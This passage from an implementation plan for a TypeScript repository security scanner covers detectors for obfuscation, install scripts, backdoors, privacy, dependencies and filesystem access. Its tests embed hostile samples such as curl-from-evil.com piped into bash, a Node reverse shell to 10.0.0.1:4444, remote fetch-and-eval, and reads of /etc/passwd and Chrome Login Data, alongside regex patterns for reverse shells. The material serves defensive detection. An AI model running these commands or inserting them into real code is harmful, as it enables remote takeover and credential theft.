    const files = [makeFile('evil.js', `eval(atob('Y29uc29sZS5sb2coImhhY2tlZCIp'));`)];
    const findings = await scanObfuscation('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('flags base64 encoded payloads', async () => {
    const files = [makeFile('payload.js', `
      const code = Buffer.from('Y29uc29sZS5sb2coImhhY2tlZCIp', 'base64').toString();
    `)];
    const findings = await scanObfuscation('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('flags hex encoded strings', async () => {
    const files = [makeFile('hex.js', `
      const cmd = '\\x63\\x75\\x72\\x6c\\x20\\x68\\x74\\x74\\x70';
    `)];
    const findings = await scanObfuscation('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('flags high-entropy strings', async () => {
    const files = [makeFile('sus.js', `
      const token = 'aK3m$9Lp!nQ2@wR5xB7cD0eF8gH1iJ4kM6oP3sT9uV2yA5bC8dE1fG4hI7jK0lN3qR6tU9wX2zA5';
    `)];
    const findings = await scanObfuscation('/repo', files);
    expect(findings.some(f => f.description.includes('entropy'))).toBe(true);
  });

  it('does not flag normal code', async () => {
    const files = [makeFile('normal.js', `
      const name = 'hello world';
      console.log(name);
    `)];
    const findings = await scanObfuscation('/repo', files);
    expect(findings.length).toBe(0);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/rules/obfuscation.test.ts`
Expected: FAIL

- [ ] **Step 3: Implement obfuscation scanner**

Replace `src/rules/obfuscation.ts`:
```typescript
import type { FileEntry } from './engine.js';
import type { Finding } from './types.js';
import { RiskCategory, Severity } from './types.js';

export function calculateEntropy(str: string): number {
  if (str.length === 0) return 0;
  const freq = new Map<string, number>();
  for (const ch of str) {
    freq.set(ch, (freq.get(ch) || 0) + 1);
  }
  let entropy = 0;
  for (const count of freq.values()) {
    const p = count / str.length;
    entropy -= p * Math.log2(p);
  }
  return entropy;
}

const EVAL_PATTERNS = [
  /\beval\s*\(/,
  /\bexec\s*\(/,
  /\bFunction\s*\(/,
  /\bsetTimeout\s*\(\s*['"`]/,
  /\bsetInterval\s*\(\s*['"`]/,
];

const BASE64_PATTERNS = [
  /atob\s*\(/,
  /btoa\s*\(/,
  /Buffer\.from\s*\([^)]+,\s*['"`]base64['"`]\)/,
  /base64[_-]?decode/i,
  /b64decode/i,
];

const HEX_PATTERN = /(?:\\x[0-9a-fA-F]{2}){4,}/;

const ZERO_WIDTH_PATTERN = /[\u200B\u200C\u200D\uFEFF\u00AD]{2,}/;

const HIGH_ENTROPY_MIN_LENGTH = 40;
const HIGH_ENTROPY_THRESHOLD = 4.5;

// Detect minified code: very long lines with no comments, many semicolons
function isLikelyMinified(content: string): boolean {
  const lines = content.split('\n');
  const longLines = lines.filter(l => l.length > 500);
  return longLines.length > 0 && longLines.length / lines.length > 0.3;
}

export async function scanObfuscation(
  _repoPath: string,
  files: FileEntry[]
): Promise<Finding[]> {
  const findings: Finding[] = [];

  for (const file of files) {
    const lines = file.content.split('\n');

    for (let i = 0; i < lines.length; i++) {
      const line = lines[i];
      const lineNum = i + 1;

      // Check eval/exec patterns
      for (const pattern of EVAL_PATTERNS) {
        if (pattern.test(line)) {
          findings.push({
            severity: Severity.HIGH,
            category: RiskCategory.OBFUSCATION,
            file: file.relativePath,
            line: lineNum,
            description: `Dynamic code execution detected (eval/exec/Function). This can hide malicious behavior.`,
            evidence: line.trim(),
            confidence: 0.75,
          });
          break;
        }
      }

      // Check base64 patterns
      for (const pattern of BASE64_PATTERNS) {
        if (pattern.test(line)) {
          findings.push({
            severity: Severity.MEDIUM,
            category: RiskCategory.OBFUSCATION,
            file: file.relativePath,
            line: lineNum,
            description: `Base64 encoding/decoding detected. Could be hiding malicious payloads.`,
            evidence: line.trim(),
            confidence: 0.7,
          });
          break;
        }
      }

      // Check hex encoded strings
      if (HEX_PATTERN.test(line)) {
        findings.push({
          severity: Severity.MEDIUM,
          category: RiskCategory.OBFUSCATION,
          file: file.relativePath,
          line: lineNum,
          description: `Hex-encoded string detected. May be hiding commands or URLs.`,
          evidence: line.trim().substring(0, 200),
          confidence: 0.7,
        });
      }

      // Check zero-width / unicode tricks
      if (ZERO_WIDTH_PATTERN.test(line)) {
        findings.push({
          severity: Severity.HIGH,
          category: RiskCategory.OBFUSCATION,
          file: file.relativePath,
          line: lineNum,
          description: `Zero-width or invisible Unicode characters detected. May be hiding code.`,
          evidence: `Line ${lineNum} contains invisible characters`,
          confidence: 0.85,
        });
      }

      // Check high entropy strings (likely encoded payloads)
      const stringMatches = line.match(/['"`]([^'"`]{40,})['"`]/g);
      if (stringMatches) {
        for (const match of stringMatches) {
          const str = match.slice(1, -1);
          if (str.length >= HIGH_ENTROPY_MIN_LENGTH) {
            const entropy = calculateEntropy(str);
            if (entropy >= HIGH_ENTROPY_THRESHOLD) {
              findings.push({
                severity: Severity.MEDIUM,
                category: RiskCategory.OBFUSCATION,
                file: file.relativePath,
                line: lineNum,
                description: `High-entropy string detected (entropy: ${entropy.toFixed(2)}). Could be an encoded payload.`,
                evidence: str.substring(0, 80) + '...',
                confidence: 0.5,
              });
            }
          }
        }
      }
    }

    // Check for minified code (file-level check)
    if (isLikelyMinified(file.content)) {
      findings.push({
        severity: Severity.MEDIUM,
        category: RiskCategory.OBFUSCATION,
        file: file.relativePath,
        line: 0,
        description: `File appears to be minified/obfuscated. Minified code in a source repo can hide malicious behavior.`,
        evidence: `Average line length suggests minification`,
        confidence: 0.6,
      });
    }
  }

  return findings;
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run tests/rules/obfuscation.test.ts`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/rules/obfuscation.ts tests/rules/obfuscation.test.ts
git commit -m "feat: implement obfuscation detection — eval, base64, hex, entropy analysis"
```

---

### Task 7: Install Scripts rules (Category 3)

**Files:**
- Modify: `src/rules/install-scripts.ts`
- Test: `tests/rules/install-scripts.test.ts`

- [ ] **Step 1: Write install scripts tests**

Create `tests/rules/install-scripts.test.ts`:
```typescript
import { describe, it, expect } from 'vitest';
import { scanInstallScripts } from '../../src/rules/install-scripts.js';
import { RiskCategory } from '../../src/rules/types.js';
import type { FileEntry } from '../../src/rules/engine.js';

function makeFile(relativePath: string, content: string): FileEntry {
  return { relativePath, absolutePath: `/repo/${relativePath}`, content, extension: relativePath.split('.').pop() || '' };
}

describe('scanInstallScripts', () => {
  it('flags postinstall scripts in package.json', async () => {
    const files = [makeFile('package.json', JSON.stringify({
      name: 'bad-pkg',
      scripts: { postinstall: 'node steal.js' },
    }))];
    const findings = await scanInstallScripts('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0].category).toBe(RiskCategory.INSTALL_SCRIPTS);
  });

  it('flags preinstall scripts', async () => {
    const files = [makeFile('package.json', JSON.stringify({
      name: 'bad-pkg',
      scripts: { preinstall: 'curl https://evil.com/payload.sh | bash' },
    }))];
    const findings = await scanInstallScripts('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('flags curl|bash patterns in shell scripts', async () => {
    const files = [makeFile('setup.sh', `#!/bin/bash\ncurl https://evil.com/install.sh | bash`)];
    const findings = await scanInstallScripts('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('flags setup.py with os.system calls', async () => {
    const files = [makeFile('setup.py', `
import os
from setuptools import setup
os.system('curl https://evil.com/payload | python')
setup(name='pkg')
    `)];
    const findings = await scanInstallScripts('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('does not flag normal package.json scripts', async () => {
    const files = [makeFile('package.json', JSON.stringify({
      name: 'good-pkg',
      scripts: { build: 'tsc', test: 'vitest run' },
    }))];
    const findings = await scanInstallScripts('/repo', files);
    expect(findings.length).toBe(0);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/rules/install-scripts.test.ts`
Expected: FAIL

- [ ] **Step 3: Implement install scripts scanner**

Replace `src/rules/install-scripts.ts`:
```typescript
import type { FileEntry } from './engine.js';
import type { Finding } from './types.js';
import { RiskCategory, Severity } from './types.js';

const DANGEROUS_NPM_SCRIPTS = ['preinstall', 'postinstall', 'preuninstall', 'postuninstall'];

const CURL_BASH_PATTERNS = [
  /curl\s+.*\|\s*(bash|sh|zsh|python|node|ruby)/i,
  /wget\s+.*\|\s*(bash|sh|zsh|python|node|ruby)/i,
  /curl\s+.*-o\s+.*&&\s*(bash|sh|chmod)/i,
  /wget\s+.*-O\s+.*&&\s*(bash|sh|chmod)/i,
];

const SETUP_PY_EXEC_PATTERNS = [
  /os\.system\s*\(/,
  /subprocess\.(call|run|Popen|check_output)\s*\(/,
  /exec\s*\(/,
  /compile\s*\(.*exec/,
];

export async function scanInstallScripts(
  _repoPath: string,
  files: FileEntry[]
): Promise<Finding[]> {
  const findings: Finding[] = [];

  for (const file of files) {
    // Check package.json for dangerous lifecycle scripts
    if (file.relativePath.endsWith('package.json')) {
      try {
        const pkg = JSON.parse(file.content);
        if (pkg.scripts) {
          for (const scriptName of DANGEROUS_NPM_SCRIPTS) {
            if (pkg.scripts[scriptName]) {
              findings.push({
                severity: Severity.HIGH,
                category: RiskCategory.INSTALL_SCRIPTS,
                file: file.relativePath,
                line: 0,
                description: `npm lifecycle script "${scriptName}" runs code during install: "${pkg.scripts[scriptName]}". This executes automatically when you run npm install.`,
                evidence: `"${scriptName}": "${pkg.scripts[scriptName]}"`,
                confidence: 0.85,
              });
            }
          }
        }
      } catch {
        // Invalid JSON — skip
      }
    }

    // Check setup.py for execution during install
    if (file.relativePath.endsWith('setup.py') || file.relativePath.endsWith('setup.cfg')) {
      const lines = file.content.split('\n');
      for (let i = 0; i < lines.length; i++) {
        for (const pattern of SETUP_PY_EXEC_PATTERNS) {
          if (pattern.test(lines[i])) {
            findings.push({
              severity: Severity.HIGH,
              category: RiskCategory.INSTALL_SCRIPTS,
              file: file.relativePath,
              line: i + 1,
              description: `setup.py executes system commands during install. This runs automatically when you pip install.`,
              evidence: lines[i].trim(),
              confidence: 0.8,
            });
            break;
          }
        }
      }
    }

    // Check shell scripts for curl|bash patterns
    if (
      file.extension === '.sh' ||
      file.extension === '.bash' ||
      file.relativePath.includes('Makefile') ||
      file.content.startsWith('#!/')
    ) {
      const lines = file.content.split('\n');
      for (let i = 0; i < lines.length; i++) {
        for (const pattern of CURL_BASH_PATTERNS) {
          if (pattern.test(lines[i])) {
            findings.push({
              severity: Severity.HIGH,
              category: RiskCategory.INSTALL_SCRIPTS,
              file: file.relativePath,
              line: i + 1,
              description: `Downloads and executes remote code. This is a common attack vector.`,
              evidence: lines[i].trim(),
              confidence: 0.9,
            });
            break;
          }
        }
      }
    }
  }

  return findings;
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run tests/rules/install-scripts.test.ts`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/rules/install-scripts.ts tests/rules/install-scripts.test.ts
git commit -m "feat: implement install script detection — npm lifecycle, setup.py, curl|bash"
```

---

### Task 8: Backdoors rules (Category 4)

**Files:**
- Modify: `src/rules/backdoors.ts`
- Test: `tests/rules/backdoors.test.ts`

- [ ] **Step 1: Write backdoor tests**

Create `tests/rules/backdoors.test.ts`:
```typescript
import { describe, it, expect } from 'vitest';
import { scanBackdoors } from '../../src/rules/backdoors.js';
import { RiskCategory } from '../../src/rules/types.js';
import type { FileEntry } from '../../src/rules/engine.js';

function makeFile(relativePath: string, content: string): FileEntry {
  return { relativePath, absolutePath: `/repo/${relativePath}`, content, extension: '.js' };
}

describe('scanBackdoors', () => {
  it('flags reverse shell patterns', async () => {
    const files = [makeFile('shell.js', `
      const net = require('net');
      const client = new net.Socket();
      client.connect(4444, '10.0.0.1', () => {
        const sh = require('child_process').spawn('/bin/sh', []);
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
      });
    `)];
    const findings = await scanBackdoors('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0].category).toBe(RiskCategory.BACKDOORS);
  });

  it('flags remote code download and execute', async () => {
    const files = [makeFile('loader.js', `
      const code = await fetch('https://evil.com/payload.js').then(r => r.text());
      eval(code);
    `)];
    const findings = await scanBackdoors('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('flags child_process.exec with dynamic input', async () => {
    const files = [makeFile('cmd.js', `
      const { exec } = require('child_process');
      exec(userInput);
    `)];
    const findings = await scanBackdoors('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('does not flag normal net usage', async () => {
    const files = [makeFile('server.js', `
      const http = require('http');
      http.createServer((req, res) => res.end('ok')).listen(3000);
    `)];
    const findings = await scanBackdoors('/repo', files);
    expect(findings.length).toBe(0);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/rules/backdoors.test.ts`
Expected: FAIL

- [ ] **Step 3: Implement backdoor scanner**

Replace `src/rules/backdoors.ts`:
```typescript
import type { FileEntry } from './engine.js';
import type { Finding } from './types.js';
import { RiskCategory, Severity } from './types.js';

const REVERSE_SHELL_PATTERNS = [
  /new\s+net\.Socket\(\)[\s\S]*?\.connect\s*\(\s*\d+/,
  /\.spawn\s*\(\s*['"`]\/?bin\/(sh|bash|zsh)['"`]/,
  /socket\.socket\s*\([\s\S]*?\.connect\s*\(/,
  /\/bin\/(sh|bash)\s*-i/,
  /nc\s+-e\s+\/bin\/(sh|bash)/,
  /bash\s+-c\s+['"`].*\/dev\/tcp\//,
];

const REMOTE_EXEC_PATTERNS = [
  /fetch\s*\([^)]+\)[\s\S]*?\.text\(\)[\s\S]*?eval\s*\(/,
  /https?:\/\/.*\.(text|json)\(\)[\s\S]*?eval/,
  /require\s*\(\s*['"`]child_process['"`]\s*\)[\s\S]*?\.exec\s*\(\s*[^'"`]/,
  /child_process['"`]\s*\)\.exec\s*\(/,
  /execSync\s*\(\s*[^'"`\s]/,
  /\.exec\s*\(\s*(?:userInput|req\.|request\.|params|query|body)/,
];

const CRON_PHONE_HOME_PATTERNS = [
  /cron\.schedule\s*\([\s\S]*?fetch\s*\(/,
  /setInterval\s*\([\s\S]*?fetch\s*\(/,
  /node-cron|node-schedule/,
];

export async function scanBackdoors(
  _repoPath: string,
  files: FileEntry[]
): Promise<Finding[]> {
  const findings: Finding[] = [];

  for (const file of files) {
    const content = file.content;
    const lines = content.split('\n');

    // Check entire file content for multi-line patterns
    for (const pattern of REVERSE_SHELL_PATTERNS) {
      const match = content.match(pattern);
      if (match) {
        const lineNum = content.substring(0, match.index).split('\n').length;
        findings.push({
          severity: Severity.CRITICAL,
          category: RiskCategory.BACKDOORS,
          file: file.relativePath,
          line: lineNum,
          description: `Reverse shell pattern detected. This gives remote attackers control of your machine.`,
          evidence: match[0].substring(0, 200).trim(),
          confidence: 0.9,
        });
      }
    }

    // Check for remote code execution
    for (const pattern of REMOTE_EXEC_PATTERNS) {
      const match = content.match(pattern);
      if (match) {
        const lineNum = content.substring(0, match.index).split('\n').length;
        findings.push({
          severity: Severity.HIGH,
          category: RiskCategory.BACKDOORS,
          file: file.relativePath,
          line: lineNum,
          description: `Remote code execution pattern detected. Code is downloaded and executed dynamically.`,
          evidence: match[0].substring(0, 200).trim(),
          confidence: 0.8,
        });
      }
    }
  }

  return findings;
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run tests/rules/backdoors.test.ts`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/rules/backdoors.ts tests/rules/backdoors.test.ts
git commit -m "feat: implement backdoor detection — reverse shells, remote exec, dynamic child_process"
```

---

## Chunk 4: Static Rule Engine — Categories 5-8

### Task 9: Privacy rules (Category 5)

**Files:**
- Modify: `src/rules/privacy.ts`
- Test: `tests/rules/privacy.test.ts`

- [ ] **Step 1: Write privacy tests**

Create `tests/rules/privacy.test.ts`:
```typescript
import { describe, it, expect } from 'vitest';
import { scanPrivacy } from '../../src/rules/privacy.js';
import { RiskCategory } from '../../src/rules/types.js';
import type { FileEntry } from '../../src/rules/engine.js';

function makeFile(relativePath: string, content: string): FileEntry {
  return { relativePath, absolutePath: `/repo/${relativePath}`, content, extension: '.js' };
}

describe('scanPrivacy', () => {
  it('flags geolocation access', async () => {
    const files = [makeFile('track.js', `navigator.geolocation.getCurrentPosition(pos => sendToServer(pos));`)];
    const findings = await scanPrivacy('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('flags clipboard monitoring', async () => {
    const files = [makeFile('spy.js', `navigator.clipboard.readText().then(text => exfiltrate(text));`)];
    const findings = await scanPrivacy('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('flags camera/microphone access', async () => {
    const files = [makeFile('media.js', `navigator.mediaDevices.getUserMedia({ video: true, audio: true });`)];
    const findings = await scanPrivacy('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('flags fingerprinting patterns', async () => {
    const files = [makeFile('fp.js', `
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      ctx.fillText('fingerprint', 10, 10);
      const hash = canvas.toDataURL();
    `)];
    const findings = await scanPrivacy('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('does not flag normal DOM usage', async () => {
    const files = [makeFile('app.js', `
      document.getElementById('app').textContent = 'Hello';
    `)];
    const findings = await scanPrivacy('/repo', files);
    expect(findings.length).toBe(0);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/rules/privacy.test.ts`
Expected: FAIL — stub returns empty array

- [ ] **Step 3: Implement privacy scanner**

Replace `src/rules/privacy.ts`:
```typescript
import type { FileEntry } from './engine.js';
import type { Finding } from './types.js';
import { RiskCategory, Severity } from './types.js';

const PRIVACY_PATTERNS: Array<{ pattern: RegExp; description: string; severity: Severity; confidence: number }> = [
  { pattern: /navigator\.geolocation/i, description: 'Geolocation access detected. The code can track your physical location.', severity: Severity.HIGH, confidence: 0.85 },
  { pattern: /navigator\.clipboard\.readText/i, description: 'Clipboard reading detected. The code can access your clipboard contents.', severity: Severity.HIGH, confidence: 0.9 },
  { pattern: /navigator\.mediaDevices\.getUserMedia/i, description: 'Camera/microphone access requested. The code can record audio or video.', severity: Severity.HIGH, confidence: 0.8 },
  { pattern: /canvas.*getContext.*toDataURL|toDataURL.*canvas/is, description: 'Canvas fingerprinting detected. This technique uniquely identifies your device.', severity: Severity.MEDIUM, confidence: 0.7 },
  { pattern: /addEventListener\s*\(\s*['"`](keydown|keypress|keyup)['"`][\s\S]*?(fetch|XMLHttpRequest|sendBeacon|\.send\()/is, description: 'Keylogging pattern detected. Keyboard events are captured and sent to a server.', severity: Severity.CRITICAL, confidence: 0.85 },
  { pattern: /navigator\.contacts/i, description: 'Contact list access detected.', severity: Severity.HIGH, confidence: 0.9 },
  { pattern: /sendBeacon\s*\(/i, description: 'Beacon API used — can send tracking data silently in the background.', severity: Severity.MEDIUM, confidence: 0.5 },
  { pattern: /new\s+Image\(\)[\s\S]*?src\s*=[\s\S]*?\?.*=/is, description: 'Tracking pixel pattern detected. Data may be sent via image request.', severity: Severity.MEDIUM, confidence: 0.5 },
];

export async function scanPrivacy(
  _repoPath: string,
  files: FileEntry[]
): Promise<Finding[]> {
  const findings: Finding[] = [];

  for (const file of files) {
    for (const { pattern, description, severity, confidence } of PRIVACY_PATTERNS) {
      const match = file.content.match(pattern);
      if (match) {
        const lineNum = file.content.substring(0, match.index).split('\n').length;
        findings.push({
          severity,
          category: RiskCategory.PRIVACY,
          file: file.relativePath,
          line: lineNum,
          description,
          evidence: match[0].substring(0, 200).trim(),
          confidence,
        });
      }
    }
  }

  return findings;
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run tests/rules/privacy.test.ts`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/rules/privacy.ts tests/rules/privacy.test.ts
git commit -m "feat: implement privacy violation detection — geolocation, clipboard, camera, fingerprinting"
```

---

### Task 10: Dependency rules (Category 6)

**Files:**
- Modify: `src/rules/dependencies.ts`
- Test: `tests/rules/dependencies.test.ts`

- [ ] **Step 1: Write dependency tests**

Create `tests/rules/dependencies.test.ts`:
```typescript
import { describe, it, expect } from 'vitest';
import { scanDependencies, detectTyposquatting } from '../../src/rules/dependencies.js';
import type { FileEntry } from '../../src/rules/engine.js';

function makeFile(relativePath: string, content: string): FileEntry {
  return { relativePath, absolutePath: `/repo/${relativePath}`, content, extension: '.json' };
}

describe('detectTyposquatting', () => {
  it('flags packages similar to popular ones', () => {
    expect(detectTyposquatting('lodahs')).toBe(true);    // lodash
    expect(detectTyposquatting('expres')).toBe(true);     // express
    expect(detectTyposquatting('chalkk')).toBe(true);     // chalk
  });

  it('allows legitimate popular packages', () => {
    expect(detectTyposquatting('lodash')).toBe(false);
    expect(detectTyposquatting('express')).toBe(false);
    expect(detectTyposquatting('react')).toBe(false);
  });
});

describe('scanDependencies', () => {
  it('flags unpinned dependency versions', async () => {
    const files = [makeFile('package.json', JSON.stringify({
      dependencies: { 'some-pkg': '*' },
    }))];
    const findings = await scanDependencies('/repo', files);
    expect(findings.some(f => f.description.includes('unpinned'))).toBe(true);
  });

  it('flags typosquatting candidates', async () => {
    const files = [makeFile('package.json', JSON.stringify({
      dependencies: { 'lodahs': '^1.0.0' },
    }))];
    const findings = await scanDependencies('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/rules/dependencies.test.ts`
Expected: FAIL

- [ ] **Step 3: Implement dependency scanner**

Replace `src/rules/dependencies.ts`:
```typescript
import type { FileEntry } from './engine.js';
import type { Finding } from './types.js';
import { RiskCategory, Severity } from './types.js';

// Top popular npm packages — typosquatting targets
const POPULAR_PACKAGES = [
  'react', 'express', 'lodash', 'axios', 'chalk', 'commander', 'webpack',
  'typescript', 'next', 'vue', 'angular', 'moment', 'request', 'debug',
  'fs-extra', 'glob', 'minimist', 'yargs', 'inquirer', 'dotenv',
  'uuid', 'semver', 'mkdirp', 'rimraf', 'async', 'underscore',
  'bluebird', 'cheerio', 'colors', 'body-parser', 'cors', 'mongoose',
  'socket.io', 'jsonwebtoken', 'bcrypt', 'nodemon', 'eslint', 'prettier',
  'jest', 'mocha', 'chai', 'puppeteer', 'sharp', 'multer', 'passport',
];

function levenshtein(a: string, b: string): number {
  const dp: number[][] = Array.from({ length: a.length + 1 }, () =>
    Array(b.length + 1).fill(0)
  );
  for (let i = 0; i <= a.length; i++) dp[i][0] = i;
  for (let j = 0; j <= b.length; j++) dp[0][j] = j;
  for (let i = 1; i <= a.length; i++) {
    for (let j = 1; j <= b.length; j++) {
      dp[i][j] = Math.min(
        dp[i - 1][j] + 1,
        dp[i][j - 1] + 1,
        dp[i - 1][j - 1] + (a[i - 1] !== b[j - 1] ? 1 : 0)
      );
    }
  }
  return dp[a.length][b.length];
}

export function detectTyposquatting(packageName: string): boolean {
  if (POPULAR_PACKAGES.includes(packageName)) return false;
  return POPULAR_PACKAGES.some(popular => {
    const dist = levenshtein(packageName, popular);
    return dist > 0 && dist <= 2 && packageName.length >= popular.length - 2;
  });
}

const UNPINNED_VERSIONS = ['*', 'latest', ''];

export async function scanDependencies(
  _repoPath: string,
  files: FileEntry[]
): Promise<Finding[]> {
  const findings: Finding[] = [];

  for (const file of files) {
    if (!file.relativePath.endsWith('package.json')) continue;

    try {
      const pkg = JSON.parse(file.content);
      const allDeps = {
        ...pkg.dependencies,
        ...pkg.devDependencies,
      };

      for (const [name, version] of Object.entries(allDeps)) {
        // Check typosquatting
        if (detectTyposquatting(name)) {
          const similar = POPULAR_PACKAGES.find(p => levenshtein(name, p) <= 2);
          findings.push({
            severity: Severity.HIGH,
            category: RiskCategory.DEPENDENCIES,
            file: file.relativePath,
            line: 0,
            description: `Package "${name}" looks like a typosquat of "${similar}". Typosquatting is a common attack vector.`,
            evidence: `"${name}": "${version}"`,
            confidence: 0.8,
          });
        }

        // Check unpinned versions
        if (UNPINNED_VERSIONS.includes(String(version))) {
          findings.push({
            severity: Severity.MEDIUM,
            category: RiskCategory.DEPENDENCIES,
            file: file.relativePath,
            line: 0,
            description: `Dependency "${name}" has an unpinned version ("${version}"). This could pull in a compromised future version.`,
            evidence: `"${name}": "${version}"`,
            confidence: 0.7,
          });
        }
      }
    } catch {
      // Invalid JSON
    }
  }

  // Note: OSV API lookup is attempted if network is available.
  // For offline scans, this is skipped — the static checks above still run.
  // OSV integration: call https://api.osv.dev/v1/query with {package: {name, ecosystem}}
  // This is best done as a separate async step; for now, typosquatting + version checks
  // provide the core dependency risk analysis.

  return findings;
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run tests/rules/dependencies.test.ts`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/rules/dependencies.ts tests/rules/dependencies.test.ts
git commit -m "feat: implement dependency risk detection — typosquatting, unpinned versions"
```

---

### Task 11: Filesystem rules (Category 7)

**Files:**
- Modify: `src/rules/filesystem.ts`
- Test: `tests/rules/filesystem.test.ts`

- [ ] **Step 1: Write filesystem tests**

Create `tests/rules/filesystem.test.ts`:
```typescript
import { describe, it, expect } from 'vitest';
import { scanFilesystem } from '../../src/rules/filesystem.js';
import { RiskCategory } from '../../src/rules/types.js';
import type { FileEntry } from '../../src/rules/engine.js';

function makeFile(relativePath: string, content: string): FileEntry {
  return { relativePath, absolutePath: `/repo/${relativePath}`, content, extension: '.js' };
}

describe('scanFilesystem', () => {
  it('flags path traversal reads', async () => {
    const files = [makeFile('hack.js', `fs.readFileSync('../../../etc/passwd');`)];
    const findings = await scanFilesystem('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0].category).toBe(RiskCategory.FILESYSTEM);
  });

  it('flags access to browser profile paths', async () => {
    const files = [makeFile('steal.js', `
      const chromeDir = process.env.HOME + '/.config/google-chrome/Default/Login Data';
      const db = readFileSync(chromeDir);
    `)];
    const findings = await scanFilesystem('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('flags sudo/privilege escalation', async () => {
    const files = [makeFile('install.sh', `#!/bin/bash\nsudo chmod 777 /etc/crontab`)];
    const findings = await scanFilesystem('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('flags writing to system directories', async () => {
    const files = [makeFile('backdoor.js', `fs.writeFileSync('/usr/local/bin/update', payload);`)];
    const findings = await scanFilesystem('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('does not flag normal file operations', async () => {
    const files = [makeFile('app.js', `fs.readFileSync('./config.json');`)];
    const findings = await scanFilesystem('/repo', files);
    expect(findings.length).toBe(0);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/rules/filesystem.test.ts`
Expected: FAIL

- [ ] **Step 3: Implement filesystem scanner**

Replace `src/rules/filesystem.ts`:
```typescript
import type { FileEntry } from './engine.js';
import type { Finding } from './types.js';
import { RiskCategory, Severity } from './types.js';

const PATH_TRAVERSAL_PATTERNS = [
  /\.\.\//g,
  /\.\.\\\\?/g,
];

const SYSTEM_PATH_PATTERNS = [
  /['"`]\/etc\//i,
  /['"`]\/usr\/(local\/)?bin\//i,
  /['"`]\/var\/log\//i,
  /['"`]C:\\\\Windows/i,
  /['"`]C:\\\\Program Files/i,
  /['"`]\/root\//i,
  /['"`]~\/\.config\/google-chrome/i,
  /['"`]~\/\.mozilla/i,
  /['"`]\.config\/google-chrome/i,
  /['"`]AppData\\\\Local\\\\Google/i,
  /['"`]\.config\/chromium/i,
  /['"`]Library\/Application Support\/Google\/Chrome/i,
  /Login Data|Cookies|Web Data/,
];

const PRIVILEGE_PATTERNS = [
  /\bsudo\b/,
  /\bpkexec\b/,
  /\bchmod\s+[0-7]*7[0-7]*/,
  /\bchown\s+root/,
  /setuid|setgid/,
];

const WRITE_SYSTEM_PATTERNS = [
  /writeFileSync\s*\(\s*['"`]\/(usr|etc|bin|sbin|var)\//i,
  /writeFileSync\s*\(\s*['"`]C:\\\\(Windows|Program)/i,
  /open\s*\(\s*['"`]\/(usr|etc|bin|sbin)\//i,
];

export async function scanFilesystem(
  _repoPath: string,
  files: FileEntry[]
): Promise<Finding[]> {
  const findings: Finding[] = [];

  for (const file of files) {
    const lines = file.content.split('\n');

    for (let i = 0; i < lines.length; i++) {
      const line = lines[i];
      const lineNum = i + 1;

      // Path traversal
      if (/['"`].*\.\.\/.*\.\.\//.test(line) || /['"`].*\.\.\\\\.*\.\.\\\\/.test(line)) {
        findings.push({
          severity: Severity.HIGH,
          category: RiskCategory.FILESYSTEM,
          file: file.relativePath,
          line: lineNum,
          description: `Path traversal detected. Code accesses files outside its own directory.`,
          evidence: line.trim(),
          confidence: 0.85,
        });
      }

      // System path access
      for (const pattern of SYSTEM_PATH_PATTERNS) {
        if (pattern.test(line)) {
          findings.push({
            severity: Severity.HIGH,
            category: RiskCategory.FILESYSTEM,
            file: file.relativePath,
            line: lineNum,
            description: `Access to system directory or sensitive browser profile detected.`,
            evidence: line.trim(),
            confidence: 0.8,
          });
          break;
        }
      }

      // Privilege escalation
      for (const pattern of PRIVILEGE_PATTERNS) {
        if (pattern.test(line)) {
          findings.push({
            severity: Severity.HIGH,
            category: RiskCategory.FILESYSTEM,
            file: file.relativePath,
            line: lineNum,
            description: `Privilege escalation attempt detected (sudo/chmod/setuid).`,
            evidence: line.trim(),
            confidence: 0.75,
          });
          break;
        }
      }

      // Writing to system locations
      for (const pattern of WRITE_SYSTEM_PATTERNS) {
        if (pattern.test(line)) {
          findings.push({
            severity: Severity.CRITICAL,
            category: RiskCategory.FILESYSTEM,
            file: file.relativePath,
            line: lineNum,
            description: `Writing to system directory detected. This could install a backdoor.`,
            evidence: line.trim(),
            confidence: 0.9,
          });
          break;
        }
      }
    }
  }

  return findings;
}
```

